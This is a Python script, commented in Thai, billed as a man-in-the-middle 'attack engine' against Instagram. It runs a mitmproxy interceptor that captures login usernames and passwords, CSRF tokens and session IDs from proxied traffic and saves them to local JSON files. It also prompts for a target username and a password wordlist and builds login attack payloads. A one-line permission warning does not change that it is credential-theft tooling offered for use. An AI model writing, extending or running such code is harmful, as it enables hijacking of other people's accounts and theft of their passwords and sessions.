#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🔄 MITM Proxy Attack Engine
Man-in-the-Middle attack for Instagram with traffic interception
"""

import time
import json
import threading
from mitmproxy import http, ctx
from mitmproxy.tools.dump import DumpMaster
from mitmproxy.options import Options
import asyncio
import requests
import random

class InstagramMITMHacker:
    def __init__(self):
        self.captured_data = []
        self.session_data = {}
        self.csrf_tokens = []
        self.proxy_port = 8080
        
    def setup_mitm_proxy(self):
        """ตั้งค่า MITM proxy server"""
        print("🔄 กำลังตั้งค่า MITM Proxy Server...")
        
        # MITM Proxy options
        opts = Options(listen_port=self.proxy_port)
        master = DumpMaster(opts)
        
        # เพิ่ม addon สำหรับดักจับ requests
        master.addons.add(self)
        
        print(f"🌐 MITM Proxy เริ่มทำงานที่ port {self.proxy_port}")
        return master
    
    def request(self, flow: http.HTTPFlow) -> None:
        """ดักจับ HTTP requests"""
        if "instagram.com" in flow.request.pretty_host:
            self.capture_instagram_request(flow)
    
    def response(self, flow: http.HTTPFlow) -> None:
        """ดักจับ HTTP responses"""
        if "instagram.com" in flow.request.pretty_host:
            self.capture_instagram_response(flow)
    
    def capture_instagram_request(self, flow):
        """ดักจับและวิเคราะห์ Instagram requests"""
        request_data = {
            "url": flow.request.pretty_url,
            "method": flow.request.method,
            "headers": dict(flow.request.headers),
            "content": flow.request.content.decode('utf-8', errors='ignore') if flow.request.content else "",
            "timestamp": time.time()
        }
        
        # ตรวจหา login requests
        if "/accounts/login" in flow.request.path:
            print(f"🎯 ตรวจพบ login request: {flow.request.pretty_url}")
            self.analyze_login_request(request_data)
        
        # ตรวจหา CSRF tokens
        if "csrftoken" in request_data["content"]:
            self.extract_csrf_token(request_data["content"])
        
        self.captured_data.append(request_data)
    
    def capture_instagram_response(self, flow):
        """ดักจับและวิเคราะห์ Instagram responses"""
        response_data = {
            "url": flow.request.pretty_url,
            "status_code": flow.response.status_code,
            "headers": dict(flow.response.headers),
            "content": flow.response.content.decode('utf-8', errors='ignore') if flow.response.content else "",
            "timestamp": time.time()
        }
        
        # ตรวจหา session data
        if "sessionid" in response_data["content"]:
            print("🍪 ตรวจพบ session data!")
            self.extract_session_data(response_data["content"])
        
        # ตรวจหา error messages
        if flow.response.status_code in [401, 403, 429]:
            print(f"⚠️ Error response: {flow.response.status_code}")
            self.handle_error_response(response_data)
    
    def analyze_login_request(self, request_data):
        """วิเคราะห์ login request"""
        print("🔍 วิเคราะห์ login request...")
        
        # แยก username และ password จาก POST data
        content = request_data["content"]
        if "username=" in content and "password=" in content:
            # Parse form data
            params = {}
            for pair in content.split("&"):
                if "=" in pair:
                    key, value = pair.split("=", 1)
                    params[key] = value
            
            if "username" in params and "password" in params:
                print(f"📱 Username: {params.get('username', 'N/A')}")
                print(f"🔑 Password: {params.get('password', 'N/A')}")
                
                # บันทึกข้อมูล
                login_attempt = {
                    "username": params.get('username'),
                    "password": params.get('password'),
                    "timestamp": request_data["timestamp"],
                    "method": "mitm_capture"
                }
                
                with open('mitm_login_attempts.json', 'a', encoding='utf-8') as f:
                    f.write(json.dumps(login_attempt, ensure_ascii=False) + "\n")
    
    def extract_csrf_token(self, content):
        """แยก CSRF token"""
        import re
        csrf_pattern = r'csrftoken["\s]*[:=]["\s]*([a-zA-Z0-9]+)'
        matches = re.findall(csrf_pattern, content)
        
        for token in matches:
            if token not in self.csrf_tokens:
                self.csrf_tokens.append(token)
                print(f"🔑 พบ CSRF token: {token[:10]}...")
    
    def extract_session_data(self, content):
        """แยก session data"""
        import re
        session_pattern = r'sessionid["\s]*[:=]["\s]*([a-zA-Z0-9%_-]+)'
        matches = re.findall(session_pattern, content)
        
        for session_id in matches:
            if len(session_id) > 20:
                self.session_data['sessionid'] = session_id
                print(f"🍪 พบ Session ID: {session_id[:20]}...")
                
                # บันทึก session
                with open('mitm_captured_session.json', 'w', encoding='utf-8') as f:
                    json.dump(self.session_data, f, indent=4)
    
    def handle_error_response(self, response_data):
        """จัดการ error responses"""
        status = response_data["status_code"]
        
        if status == 429:
            print("🚨 Rate limited! ต้องลดความเร็วการโจมตี")
        elif status == 401:
            print("❌ Unauthorized - รหัสผ่านผิด")
        elif status == 403:
            print("🔒 Forbidden - บัญชีถูกล็อคหรือมีการป้องกัน")
    
    def create_attack_payload(self, username, password, csrf_token=None):
        """สร้าง payload สำหรับโจมตี"""
        if not csrf_token and self.csrf_tokens:
            csrf_token = self.csrf_tokens[-1]  # ใช้ token ล่าสุด
        
        payload = {
            "username": username,
            "password": password,
            "queryParams": "{}",
            "optIntoOneTap": "false"
        }
        
        if csrf_token:
            payload["csrfmiddlewaretoken"] = csrf_token
        
        return payload
    
    def launch_mitm_attack(self, target, wordlist_file):
        """เริ่ม MITM attack"""
        print("🔄 เริ่ม MITM Attack Mode")
        print("="*50)
        
        # Setup proxy
        master = self.setup_mitm_proxy()
        
        # โหลด wordlist
        try:
            with open(wordlist_file, 'r', encoding='utf-8') as f:
                passwords = [line.strip() for line in f if line.strip()]
            print(f"📚 โหลด {len(passwords)} passwords")
        except Exception as e:
            print(f"❌ ไม่สามารถโหลด wordlist: {e}")
            return
        
        # เริ่ม proxy server ในเธรดแยก
        def run_proxy():
            try:
                asyncio.run(master.run())
            except KeyboardInterrupt:
                pass
        
        proxy_thread = threading.Thread(target=run_proxy, daemon=True)
        proxy_thread.start()
        
        print("🌐 MITM Proxy กำลังทำงาน...")
        print(f"📋 คำแนะนำ:")
        print(f"   1. ตั้งค่า proxy ใน browser: 127.0.0.1:{self.proxy_port}")
        print(f"   2. ติดตั้ง SSL certificate ของ mitmproxy")
        print(f"   3. เปิด Instagram และลอง login")
        print(f"   4. MITM จะดักจับข้อมูลทั้งหมด")
        
        # รอให้ user ตั้งค่า proxy
        input("\n⏳ กด Enter เมื่อตั้งค่า proxy เรียบร้อยแล้ว...")
        
        # รอการดักจับข้อมูล
        print("🔍 กำลังรอการดักจับข้อมูล...")
        print("💡 ลอง login Instagram ด้วย browser ที่ตั้งค่า proxy แล้ว")
        
        # ให้เวลาในการดักจับข้อมูล
        time.sleep(30)
        
        # แสดงผลลัพธ์
        self.show_mitm_results()
    
    def show_mitm_results(self):
        """แสดงผลลัพธ์การดักจับ"""
        print("\n📊 ผลลัพธ์ MITM Attack:")
        print("="*40)
        
        print(f"📡 Requests ที่ดักจับ: {len(self.captured_data)}")
        print(f"🔑 CSRF tokens: {len(self.csrf_tokens)}")
        print(f"🍪 Session data: {'Yes' if self.session_data else 'No'}")
        
        if self.csrf_tokens:
            print(f"🔑 CSRF Token ล่าสุด: {self.csrf_tokens[-1][:20]}...")
        
        if self.session_data:
            print(f"🍪 Session ID: {self.session_data.get('sessionid', 'N/A')[:20]}...")
        
        # บันทึกผลลัพธ์
        results = {
            "captured_requests": len(self.captured_data),
            "csrf_tokens": self.csrf_tokens,
            "session_data": self.session_data,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        
        with open('mitm_attack_results.json', 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=4, ensure_ascii=False)
        
        print("💾 ผลลัพธ์บันทึกใน mitm_attack_results.json")

def main():
    print("🔄 SugarGlitch MITM Attack Engine")
    print("="*50)
    print("🎯 Features:")
    print("  • Traffic interception")
    print("  • CSRF token extraction")
    print("  • Session data capture")
    print("  • Login attempt monitoring")
    print()
    
    target = input("🎯 ใส่ Instagram username เป้าหมาย: ").strip()
    if not target:
        print("❌ ต้องใส่ username")
        return
    
    print("\n📚 Wordlist ที่มี:")
    print("1. whatilove1728.txt")
    print("2. alx_trading_passwords.txt")
    print("3. common_passwords.txt")
    
    choice = input("\n🤔 เลือก wordlist (1-3): ").strip()
    wordlist_map = {
        "1": "whatilove1728.txt",
        "2": "alx_trading_passwords.txt",
        "3": "common_passwords.txt"
    }
    
    if choice not in wordlist_map:
        print("❌ เลือก 1-3 เท่านั้น")
        return
    
    # เตือนด้านจริยธรรม
    print("\n⚠️ คำเตือน: ต้องมี mitmproxy ติดตั้งและใช้เฉพาะกับบัญชีที่ได้รับอนุญาต")
    confirm = input("ยืนยันการใช้งาน (yes/no): ").strip().lower()
    
    if confirm != 'yes':
        print("❌ ยกเลิกการใช้งาน")
        return
    
    # เริ่ม MITM attack
    hacker = InstagramMITMHacker()
    hacker.launch_mitm_attack(target, wordlist_map[choice])

if __name__ == "__main__":
    main()
